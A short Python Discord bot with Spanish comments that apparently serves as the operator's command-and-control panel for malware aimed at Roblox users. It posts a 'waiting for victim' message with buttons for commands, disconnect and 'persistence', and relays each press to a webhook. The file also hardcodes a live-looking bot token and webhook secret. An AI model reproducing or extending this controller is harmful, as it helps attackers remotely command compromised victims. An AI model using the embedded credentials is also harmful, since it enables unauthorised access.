import discord
from discord.ext import commands
import aiohttp
import os

TOKEN = "MTQ3MTQxNzAwNjk4NDEzODgxNA.GjSujy.ZPO3R8pO60ZTcli56pglJgnu7DVysVqh_Ti9QI"
WEBHOOK_URL = "https://discord.com/api/webhooks/1470992345926209729/Fqa2GPdiJPbF_daigglkcvdvkRwyPLc-XBETHFrVgGO8IHjH5z9ohQX1StBYJRDoPygI"
CANAL_ID = 1470990515238600755

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"✅ Bot conectado: {bot.user}")
    canal = bot.get_channel(CANAL_ID)
    
    # MENSAJE CON BOTONES (PERMANENTE)
    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="🟣 COMANDOS", style=discord.ButtonStyle.danger, custom_id="menu_comandos"))
    view.add_item(discord.ui.Button(label="ℹ️ INFO", style=discord.ButtonStyle.primary, custom_id="menu_info"))
    view.add_item(discord.ui.Button(label="❌ DISCONNECT", style=discord.ButtonStyle.danger, custom_id="desconectar"))
    view.add_item(discord.ui.Button(label="🔵 PERSISTENCIA", style=discord.ButtonStyle.success, custom_id="persistencia"))
    
    await canal.send("@everyone\n**🎯 ESPERANDO VÍCTIMA...**\n**⚡ SISTEMA LISTO**", view=view)

@bot.event
async def on_interaction(interaction):
    if interaction.type == discord.InteractionType.component:
        custom_id = interaction.data["custom_id"]
        
        # ENVIAR EL COMANDO AL WEBHOOK DE ROBLOX
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
            await webhook.send(f"comando:{custom_id}")
        
        await interaction.response.send_message(f"✅ Comando enviado: {custom_id}", ephemeral=True)

bot.run(TOKEN)
